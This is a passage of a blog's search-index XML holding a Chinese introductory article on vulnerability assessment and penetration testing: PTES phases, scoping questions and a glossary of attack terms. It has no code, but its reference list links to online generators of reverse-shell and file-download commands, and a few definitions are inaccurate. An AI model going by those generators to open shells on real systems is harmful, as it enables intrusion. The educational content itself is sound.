title="脆弱性评估与渗透测试："></a><strong>脆弱性评估与渗透测试：</strong></h4><p>脆弱性评估通过<strong>分析企业资产面临安全威胁</strong>的情况和程度，评估内部和外部的安全控制的安全性。这种技术上的信息系统评估，不仅<strong>揭露</strong>现有防范措施里存在的<strong>风险</strong>，而且要提出多重备选的补救策略，并将这些策略进行比较。内部的脆弱性评估可保证内部系统的安全性，而外部的脆弱性评估则时验证边界防护的有效性。无论进行内部脆弱性评估还是进行外部脆弱性评估，评估人员都会采用各种攻击模式来严格测试网络的资产的安全性，从而验证信息系统处理安全威胁的能力，进而确定应对措施的有效性。不同类型的脆弱性评估需要的测试流程、测试工具和自动化的测试技术也不相同。这可以通过一体化的安全弱点管控平台（vulnerability management）来实现，现在的安全弱点管理平台带有可自动更新的漏洞数数据库，能够测试不同类型的网络设备，而且不会影响配置管理和变更管理的完整性。<strong>简单来说脆弱性评估其实就是漏洞扫描</strong>，只是在漏洞扫描的基础上要提出防御策略。<br><strong>脆弱性评估</strong>和<strong>渗透测试</strong>最大的<strong>区别</strong>就是，渗透测试不仅要识别<strong>目标的弱点</strong>，它还要设计在目标的系统上进行<strong>漏洞利用、权限提升和访问维护</strong>。换句话说，脆弱性评价虽然可以充分发现系统里的缺陷，但不会取考虑取衡量这些缺陷对系统造成的危害。另外，相比脆弱性评估，<strong>渗透测试更倾向于入侵</strong>，会刻意使用各种技术手段利用安全漏洞；所以渗透测试可能对生产环境带来实际的破坏性影响，<strong>而脆弱性评估以非入侵的方式</strong>，定性、定量得识别已知的安全弱点。简单来说渗透测试就算<strong>发现漏洞</strong>，并进行<strong>漏洞利用</strong>。</p><h4 id="渗透测试流程："><a href="#渗透测试流程：" class="headerlink" title="渗透测试流程："></a>渗透测试流程：</h4><p>渗透测试执行标准PTES（Penetration Testing Execution Standard）的先驱都是渗透测试行业的精英，渗透测试执行标准包含两个部分：PTES 方法论；PTES 技术指南。这个标准由渗透测试7个阶段的标准组成，可以在任意环境中进行富有成果的渗透测试。官网为<code>http:www.pentest-standard.org/index.php/Main_Page</code>。 </p><p><strong>渗透测试7个阶段如下：</strong><br>（1） 事前互动<br>（2） 情报搜集<br>（3） 威胁建模<br>（4）漏洞分析<br>（5） 漏洞利用<br>（6） 深度利用<br>（7） 报告阶段</p><p><strong>通用渗透测试框架</strong><br>从技术管理的角度来看，遵循正规的测试框架对安全测试极为重要。通用渗透测试框架涵盖了典型的审计测试工作和渗透测试工作会涉及到的各个阶段。相关阶段如下：<br>（1） 范围界定<br>（2） 信息搜集<br>（3） 目标识别<br>（4）服务枚举<br>（5） 漏洞映射<br>（6） 社会工程学<br>（7）漏洞利用<br>（8）权限提升<br>（9） 访问维护<br>（10） 文档报告</p><p><strong>前期范围界定</strong><br>在开始技术性安全评估之间，务必要观察、研究目标环境的被测范围 。同时还要了解，这个范围牵扯多少个单位，是单个单位还是多个单位会参与到安全评估的工作中来，在范围界定阶段，需要考虑的典型因素如下：</p><ul><li>取得授权。</li><li>测试对象是什么？</li><li>应当采取何种测试方法？</li><li>有哪些在测试过程中需要满足的条件？</li><li>哪些因素可能会限制测试执行的过程？</li><li>需要多久才能完成测试？</li><li>此次测试应当达成什么样的任务目标？</li><li>是否是复测？</li></ul><h2 id="专业名词"><a href="#专业名词" class="headerlink" title="专业名词"></a>专业名词</h2><p><strong>1、渗透测试</strong>：指专业安全测试人员使用黑客技术手段对网络和应用程序进行安全性评估的过程。</p><p><strong>2、端口扫描</strong>：指通过发送各种类型的数据包到目标计算机来确定该计算机上哪些端口处于打开状态。</p><p><strong>3、漏洞扫描</strong>：指通过自动化工具对目标系统进行扫描，发现其中存在的漏洞。</p><p><strong>4、社会工程学攻击</strong>：指利用心理学和社交工程学的方法来欺骗、诱骗或迷惑目标，从而获得对目标系统的访问权限。</p><p><strong>5、木马</strong>：指一种隐藏在计算机程序或文件中的恶意软件，能够给攻击者提供对被攻击计算机的控制。</p><p><strong>6、根目录访问</strong>：指攻击者成功地获取了目标计算机的管理员权限，从而能够访问该计算机上的所有文件和文件夹。</p><p><strong>7、会话劫持</strong>：指攻击者通过某种方式获取到受害者的会话ID，从而能够在受害者退出该会话后继续访问该会话。</p><p><strong>8、SQL注入</strong>：指利用特殊的SQL语句来绕过Web应用程序的安全机制，从而访问、修改或删除该应用程序中的数据库信息。</p><p><strong>9、XSS攻击</strong>：指通过向Web页面注入恶意代码来攻击Web应用程序的一种方式。</p><p><strong>10、CSRF攻击</strong>：指攻击者伪造一个请求，然后将该请求发送给受害者，从而利用受害者的权限来执行某种操作。</p><p><strong>11、POC</strong> :  (Proof of concept)”观点证明” </p><p><strong>12、EXP</strong> : (Exploit) “漏洞利用”</p><p><strong>13、Payload</strong> : 中文 ‘ 有效载荷 ‘，指成功exploit之后，攻击代码释放的具有攻击能力的能够实现攻击者目的的代码。</p><p><strong>14、Shellcode</strong> : Shellcode  维基上被定义为一段用于利用软件漏洞而执行的代码，这段代码通常的功能是获得一个shell，因此得名Shellcode。</p><p><strong>15、漏洞利用</strong>：指攻击者利用已知漏洞来进一步入侵目标系统。</p><p><strong>16、拒绝服务攻击（DoS攻击）</strong>：指攻击者通过向目标系统发送大量请求或无效数据来占用系统资源，导致系统无法正常工作。</p><p><strong>17、缓冲区溢出</strong>：指攻击者向目标系统发送超出预期输入长度的数据，导致系统崩溃或受到攻击者的控制。</p><p><strong>18、反向Shell</strong>：指攻击者通过在目标系统上安装恶意软件来获取对该系统的控制，使其成为攻击者的“僵尸”计算机。</p><p><strong>19、嗅探</strong>：指攻击者拦截和监视网络流量，以获取敏感信息，如登录凭据、密码等。</p><p><strong>20、密码破解</strong>：指攻击者使用字典攻击、暴力破解等技术来获取目标系统的密码。</p><p><strong>21、物理安全评估</strong>：指渗透测试人员评估目标设施的物理安全性，包括入侵检测、视频监控、门禁等方面。</p><p><strong>22、网络安全评估</strong>：指渗透测试人员评估目标网络的安全性，包括网络拓扑、设备配置、网络协议等方面。</p><p><strong>23、应用程序安全评估</strong>：指渗透测试人员评估目标应用程序的安全性，包括Web应用程序、移动应用程序等方面。</p><p><strong>24、红队演习</strong>：指模拟实际攻击的场景，对目标系统进行测试和评估，以发现和修复安全漏洞。</p><p>  参考文章与工具：<br>  像风一样的9文章链接：<a href="https://blog.csdn.net/m0_64378913/article/details/124063400">https://blog.csdn.net/m0_64378913/article/details/124063400</a><br>  渗透测试常用术语总结：<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a><br>  渗透测试常用命令：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a><br>  文件下载命令一键生成：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a><br>  反弹shell命令一键生成：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>test</title>
+      <link href="/2023/03/14/test1/"/>
+      <url>/2023/03/14/test1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="测试模板"><a href="#测试模板" class="headerlink" title="测试模板"></a>测试模板</h1>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> test </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
